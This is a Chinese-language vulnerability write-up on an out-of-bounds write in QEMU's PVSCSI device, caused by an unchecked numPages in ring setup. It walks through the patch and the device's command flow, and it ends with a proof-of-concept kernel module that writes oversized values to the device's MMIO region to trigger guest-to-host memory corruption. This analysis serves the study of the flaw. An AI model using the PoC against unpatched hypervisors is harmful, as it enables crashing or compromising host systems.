### cve概述

并未对for循环边界进行检测，从而导致了可以越界访问内存中不存在的地址

### 前期环境配置

该漏洞是在2.5.1进行的patch，所以前面版本的qemu都可以，我就随手选了一个临近的版本。

因为我是已经git好了一份qemu源码，所以我直接进行了分支切换

```shell
git checkout e5b3a24
```

接下来就是qemu环境的构建

```shell
mkdir -p bin/debug/naive
cd bin/debug/naive
../../../configure --target-list=x86_64-softmmu --enable-debug --disable-werror
make
```

虚拟机镜像的话，不知道为何，曾经做的centos镜像起不来.......就向朋友讨了一份他制作的ubuntu镜像，成功启动。

### 漏洞溯源

看官方给出的patch内容

```c
--- a/hw/scsi/vmw_pvscsi.c
+++ b/hw/scsi/vmw_pvscsi.c
@@ -153,7 +153,7 @@ pvscsi_log2(uint32_t input)
     return log;
 }
 
-static void
+static int
 pvscsi_ring_init_data(PVSCSIRingInfo *m, PVSCSICmdDescSetupRings *ri)
 {
     int i;
@@ -161,6 +161,10 @@ pvscsi_ring_init_data(PVSCSIRingInfo *m, PVSCSICmdDescSetupRings *ri)
     uint32_t req_ring_size, cmp_ring_size;
     m->rs_pa = ri->ringsStatePPN << VMW_PAGE_SHIFT;
 
+    if ((ri->reqRingNumPages > PVSCSI_SETUP_RINGS_MAX_NUM_PAGES)
+        || (ri->cmpRingNumPages > PVSCSI_SETUP_RINGS_MAX_NUM_PAGES)) {
+        return -1;
+    }
     req_ring_size = ri->reqRingNumPages * PVSCSI_MAX_NUM_REQ_ENTRIES_PER_PAGE;
     cmp_ring_size = ri->cmpRingNumPages * PVSCSI_MAX_NUM_CMP_ENTRIES_PER_PAGE;
     txr_len_log2 = pvscsi_log2(req_ring_size - 1);
@@ -192,15 +196,20 @@ pvscsi_ring_init_data(PVSCSIRingInfo *m, PVSCSICmdDescSetupRings *ri)
 
     /* Flush ring state page changes */
     smp_wmb();
+
+    return 0;
 }
 
-static void
+static int
 pvscsi_ring_init_msg(PVSCSIRingInfo *m, PVSCSICmdDescSetupMsgRing *ri)
 {
     int i;
     uint32_t len_log2;
     uint32_t ring_size;
 
+    if (ri->numPages > PVSCSI_SETUP_MSG_RING_MAX_NUM_PAGES) {
+        return -1;
+    }
     ring_size = ri->numPages * PVSCSI_MAX_NUM_MSG_ENTRIES_PER_PAGE;
     len_log2 = pvscsi_log2(ring_size - 1);
 
@@ -220,6 +229,8 @@ pvscsi_ring_init_msg(PVSCSIRingInfo *m, PVSCSICmdDescSetupMsgRing *ri)
 
     /* Flush ring state page changes */
     smp_wmb();
+
+    return 0;
 }
 
 static void
@@ -770,7 +781,10 @@ pvscsi_on_cmd_setup_rings(PVSCSIState *s)
     trace_pvscsi_on_cmd_arrived("PVSCSI_CMD_SETUP_RINGS");
 
     pvscsi_dbg_dump_tx_rings_config(rc);
-    pvscsi_ring_init_data(&s->rings, rc);
+    if (pvscsi_ring_init_data(&s->rings, rc) < 0) {
+        return PVSCSI_COMMAND_PROCESSING_FAILED;
+    }
+
     s->rings_info_valid = TRUE;
     return PVSCSI_COMMAND_PROCESSING_SUCCEEDED;
 }
@@ -850,7 +864,9 @@ pvscsi_on_cmd_setup_msg_ring(PVSCSIState *s)
     }
 
     if (s->rings_info_valid) {
-        pvscsi_ring_init_msg(&s->rings, rc);
+        if (pvscsi_ring_init_msg(&s->rings, rc) < 0) {
+            return PVSCSI_COMMAND_PROCESSING_FAILED;
+        }
         s->msg_ring_info_valid = TRUE;
     }
     return sizeof(PVSCSICmdDescSetupMsgRing) / sizeof(uint32_t);
```

可以知道是pvscsi设备出现的问题，那么我们就找到对应的文件，观察一下是如何交互的。

```c
hw/scsi/vmw_pvscsi.c
......
pvscsi_io_write(void *opaque, hwaddr addr,
                uint64_t val, unsigned size)
{...}
......
pvscsi_io_read(void *opaque, hwaddr addr, unsigned size)
{...}
......
```

可以发现，只有这一种交互的入口，而这种I/O的交互方式，需要我们编写一个内核模块，加载进去，从而与其进行交互。

现在主要来看`pvscsi_io_write`函数以及其对应的一些重要的数据结构

```c
//数据结构
enum PVSCSIRegOffset {
    PVSCSI_REG_OFFSET_COMMAND        =    0x0,
    PVSCSI_REG_OFFSET_COMMAND_DATA   =    0x4,
    PVSCSI_REG_OFFSET_COMMAND_STATUS =    0x8,
    PVSCSI_REG_OFFSET_LAST_STS_0     =  0x100,
    PVSCSI_REG_OFFSET_LAST_STS_1     =  0x104,
    PVSCSI_REG_OFFSET_LAST_STS_2     =  0x108,
    PVSCSI_REG_OFFSET_LAST_STS_3     =  0x10c,
    PVSCSI_REG_OFFSET_INTR_STATUS    = 0x100c,
    PVSCSI_REG_OFFSET_INTR_MASK      = 0x2010,
    PVSCSI_REG_OFFSET_KICK_NON_RW_IO = 0x3014,
    PVSCSI_REG_OFFSET_DEBUG          = 0x3018,
    PVSCSI_REG_OFFSET_KICK_RW_IO     = 0x4018,
};
```

```c
static void
pvscsi_io_write(void *opaque, hwaddr addr,
                uint64_t val, unsigned size)
{
    PVSCSIState *s = opaque;

    switch (addr) { // 这里的addr对应的就是上面的PVSCSIRegOffset
    case PVSCSI_REG_OFFSET_COMMAND:
        pvscsi_on_command(s, val);
        break;

    case PVSCSI_REG_OFFSET_COMMAND_DATA:
        pvscsi_on_command_data(s, (uint32_t) val);
        break;
	......
    }
}
```

先来看`PVSCSI_REG_OFFSET_COMMAND`中对应的`pvscsi_on_command`函数

```c
static void
pvscsi_on_command(PVSCSIState *s, uint64_t cmd_id)
{
    if ((cmd_id > PVSCSI_CMD_FIRST) && (cmd_id < PVSCSI_CMD_LAST)) {
        s->curr_cmd = cmd_id;
    } else {
        s->curr_cmd = PVSCSI_CMD_FIRST;
        trace_pvscsi_on_cmd_unknown(cmd_id);
    }

    s->curr_cmd_data_cntr = 0;
    s->reg_command_status = PVSCSI_COMMAND_NOT_ENOUGH_DATA;

    pvscsi_do_command_processing(s);
}
```

其主要作用就是设置s->curr_cmd为你输入的value（对应的就是这里的cmd_id）以及初始化`s->curr_cmd_data`

再来看`PVSCSI_REG_OFFSET_COMMAND_DATA`中对应的`pvscsi_on_command_data`函数

```c
static void
pvscsi_on_command_data(PVSCSIState *s, uint32_t value) // 将value写入对应的data中
{
    size_t bytes_arrived = s->curr_cmd_data_cntr * sizeof(uint32_t);

    assert(bytes_arrived < sizeof(s->curr_cmd_data));
    s->curr_cmd_data[s->curr_cmd_data_cntr++] = value;

    pvscsi_do_command_processing(s);
}

static void
pvscsi_do_command_processing(PVSCSIState *s)
{
    size_t bytes_arrived = s->curr_cmd_data_cntr * sizeof(uint32_t);

    assert(s->curr_cmd < PVSCSI_CMD_LAST);
    if (bytes_arrived >= pvscsi_commands[s->curr_cmd].data_size) { //上面设置的cmd_id主要在这里进行运用
        s->reg_command_status = pvscsi_commands[s->curr_cmd].handler_fn(s);
        s->curr_cmd = PVSCSI_CMD_FIRST;
        s->curr_cmd_data_cntr   = 0;
    }
}
```

这里又涉及到一个数据结构，`s->reg_command_status = pvscsi_commands[s->curr_cmd].handler_fn(s)`就是根据你一开始设置的`s->curr_cmd`在这里寻找数据结构里对应的函数进行调用，数据结构如下：

```c
static const struct {
    int       data_size;
    uint64_t  (*handler_fn)(PVSCSIState *s);
} pvscsi_commands[] = {
    [PVSCSI_CMD_FIRST] = {
        .data_size = 0,
        .handler_fn = pvscsi_on_cmd_unknown,
    },

    /* Not implemented, data size defined based on what arrives on windows */
    [PVSCSI_CMD_CONFIG] = {
        .data_size = 6 * sizeof(uint32_t),
        .handler_fn = pvscsi_on_cmd_config,
    },

    /* Command not implemented, data size is unknown */
    [PVSCSI_CMD_ISSUE_SCSI] = {
        .data_size = 0,
        .handler_fn = pvscsi_on_issue_scsi,
    },

    /* Command not implemented, data size is unknown */
    [PVSCSI_CMD_DEVICE_UNPLUG] = {
        .data_size = 0,
        .handler_fn = pvscsi_on_cmd_unplug,
    },

    [PVSCSI_CMD_SETUP_RINGS] = {
        .data_size = sizeof(PVSCSICmdDescSetupRings),
        .handler_fn = pvscsi_on_cmd_setup_rings,
    },

    [PVSCSI_CMD_RESET_DEVICE] = {
        .data_size = sizeof(struct PVSCSICmdDescResetDevice),
        .handler_fn = pvscsi_on_cmd_reset_device,
    },

    [PVSCSI_CMD_RESET_BUS] = {
        .data_size = 0,
        .handler_fn = pvscsi_on_cmd_reset_bus,
    },

    [PVSCSI_CMD_SETUP_MSG_RING] = {
        .data_size = sizeof(PVSCSICmdDescSetupMsgRing),
        .handler_fn = pvscsi_on_cmd_setup_msg_ring,
    },

    [PVSCSI_CMD_ADAPTER_RESET] = {
        .data_size = 0,
        .handler_fn = pvscsi_on_cmd_adapter_reset,
    },

    [PVSCSI_CMD_ABORT_CMD] = {
        .data_size = sizeof(struct PVSCSICmdDescAbortCmd),
        .handler_fn = pvscsi_on_cmd_abort,
    },
};
```

我们的视角再回到官方给出的patch，可以看到一共对这个数据结构里面两个函数进行了patch，分别是`pvscsi_on_cmd_setup_msg_ring` 和 `pvscsi_on_cmd_setup_rings`分别对应`pvscsi_commands[8].handler_fn(s)` 和 `pvscsi_commands[3].handler_fn(s)` （这里在调试的时候发现下标好像和源码里不大一样）

同时`pvscsi_do_command_processing`函数中`pvscsi_commands[s->curr_cmd].data_size`也可以在该数据结构中找到对应的初始化

### 漏洞分析

有了前面的铺垫，我们可以发现其大致的调用流程就是`pvscsi_io_write`-->`pvscsi_on_command_data`-->`pvscsi_do_command_processing`-->`pvscsi_commands[s->curr_cmd].handler_fn(s)`，然后根据不同的`s->curr_cmd`去调用不同的函数。

#### pvscsi_on_cmd_setup_msg_ring分析

```c
static void
pvscsi_on_command_data(PVSCSIState *s, uint32_t value)
{
    size_t bytes_arrived = s->curr_cmd_data_cntr * sizeof(uint32_t);

    assert(bytes_arrived < sizeof(s->curr_cmd_data));
    s->curr_cmd_data[s->curr_cmd_data_cntr++] = value;

    pvscsi_do_command_processing(s);
}
```

sizeof(s->curr_cmd_data)为528，所以一共可以循环132次，数据会被依次写入`s->curr_cmd_data[s->curr_cmd_data_cntr++]`中

然后来到了`pvscsi_do_command_processing`函数

```c
static void
pvscsi_do_command_processing(PVSCSIState *s)
{
    size_t bytes_arrived = s->curr_cmd_data_cntr * sizeof(uint32_t);

    assert(s->curr_cmd < PVSCSI_CMD_LAST);
    if (bytes_arrived >= pvscsi_commands[s->curr_cmd].data_size) {
        s->reg_command_status = pvscsi_commands[s->curr_cmd].handler_fn(s);
        s->curr_cmd = PVSCSI_CMD_FIRST;
        s->curr_cmd_data_cntr   = 0;
    }
}
```

这里的`pvscsi_commands[s->curr_cmd].data_size`也就是`sizeof(PVSCSICmdDescSetupMsgRing)`为136，也就是说，你得循环34次才能进入到`pvscsi_on_cmd_setup_msg_ring`函数

```c
static uint64_t
pvscsi_on_cmd_setup_msg_ring(PVSCSIState *s)
{
    PVSCSICmdDescSetupMsgRing *rc =
        (PVSCSICmdDescSetupMsgRing *) s->curr_cmd_data;

    trace_pvscsi_on_cmd_arrived("PVSCSI_CMD_SETUP_MSG_RING");

    if (!s->use_msg) {
        return PVSCSI_COMMAND_PROCESSING_FAILED;
    }

    if (s->rings_info_valid) {
        pvscsi_ring_init_msg(&s->rings, rc);
        s->msg_ring_info_valid = TRUE;
    }
    return sizeof(PVSCSICmdDescSetupMsgRing) / sizeof(uint32_t);
}
```

这里会将我们上面写入s->curr_cmd_data中的数据copy到rc中，再调用`pvscsi_ring_init_msg`函数

```c
static void
pvscsi_ring_init_msg(PVSCSIRingInfo *m, PVSCSICmdDescSetupMsgRing *ri)
{
    ......

    for (i = 0; i < ri->numPages; i++) {
        m->msg_ring_pages_pa[i] = ri->ringPPNs[i] << VMW_PAGE_SHIFT;
    }

    ......
}
```

主要的漏洞点就发生在这儿，ri->numPages因为是我们在`pvscsi_on_cmd_setup_msg_ring`函数中直接通过`PVSCSICmdDescSetupMsgRing *rc =(PVSCSICmdDescSetupMsgRing *) s->curr_cmd_data;`获得的，并未对其进行检测，这就有可能导致了ri->numPages超出了我们预设的值，从而引发数据的越界访问

示例如下：

可以看到，vmmap中内存分布

![image-20201228143028714](https://gitee.com/zhzzhz/blog_warehouse/raw/master/img/image-20201228143028714.png)

我们的ri->ringPPNs地址如下：

![image-20201228143108644](https://gitee.com/zhzzhz/blog_warehouse/raw/master/img/image-20201228143108644.png)

我们的ri->numPages为0x41414141，这就导致了我们会访问到0x555557818cac + 0x48484848 * 64的地址，也就是0x557193BDC8CC，明显的不存在这个地址，也就是引发了越界访问。

这里给出vmw_pvscsi.h文件中原本构想的对应的数据结构内容，可以看出其都是预设好的，但是很遗憾，在实际的编写过程中并没有对其进行检测，查看它是否满足自己的预设，从而导致了越界情况发生

```C
#define VMW_PAGE_SHIFT (12)
#define PVSCSI_SETUP_RINGS_MAX_NUM_PAGES        32
    
/*
-RequingNumPages和cmpRingNumPages需要是2的幂。
-RequingNumPages和cmpRingNumPages不为0，
-REQURINGNUMPAGES和cmpRingNumPages需要低于PVSCSI_SETUP_RINGS_MAX_NUM_PAGES（也就是32）
*/
struct PVSCSICmdDescSetupRings {
    uint32_t    reqRingNumPages;
    uint32_t    cmpRingNumPages;
    uint64_t    ringsStatePPN;
    uint64_t    reqRingPPNs[PVSCSI_SETUP_RINGS_MAX_NUM_PAGES];
    uint64_t    cmpRingPPNs[PVSCSI_SETUP_RINGS_MAX_NUM_PAGES];
} QEMU_PACKED;

/*
numPages必须是2的幂，且不为0
pad必须为0
*/

struct PVSCSICmdDescSetupMsgRing {
    uint32_t    numPages;
    uint32_t    pad;
    uint64_t    ringPPNs[PVSCSI_SETUP_MSG_RING_MAX_NUM_PAGES];
} QEMU_PACKED;
```

pvscsi_on_cmd_setup_rings也是类似的情况，这里就不再赘述。

那么我们总结一下思路：

1. 先设置我们的s->curr_cmd为对应的分支，以在后面触发我们需要的函数
2. 伪造好足够多的数据写入，并且数据应该足够大，能够导致最后触发越界读写

这里就直接贴上我们的poc：

```c
#include <asm/io.h>
#include <linux/module.h>
#include <linux/ioport.h>
#include <linux/random.h>
#include <linux/slab.h>

long pmem;
void m_init(void){
	int *m;
    printk("m_init\n");
    pmem = ioremap(0xfebf0000,0x2000);
	m = kmalloc(0x2000,GFP_KERNEL);
	for (int i = 0; i < 0x100; i++)
		m[i] = 0x48484848;
        if (pmem){
		writel(8,pmem);
		for (int i = 0; i < 0x100; i++)	
                	writel(m[i],pmem+0x4);
        iounmap(pmem);
	}
        return;
}

void m_exit(void){
        printk("m_exit\n");
        return;
}
module_init(m_init);
module_exit(m_exit);


```

对应的Makefile如下

```makefile
PWD := $(shell pwd)
KVERSION := $(shell uname -r)
KERNEL_DIR = /usr/src/linux-headers-$(KVERSION)/
ccflags-y := -std=gnu99

MODULE_NAME = test
obj-m := $(MODULE_NAME).o

all:
	make -C $(KERNEL_DIR) M=$(PWD) modules
clean:
	make -C $(KERNEL_DIR) M=$(PWD) clean

```

对应的加载内核模块命令为：insmod test.ko

卸载内核模块命令为：rmmod test.ko

模块的加载信息并不会打印在屏幕上，需要你自己去查看，查看系统日志：dmesg | tail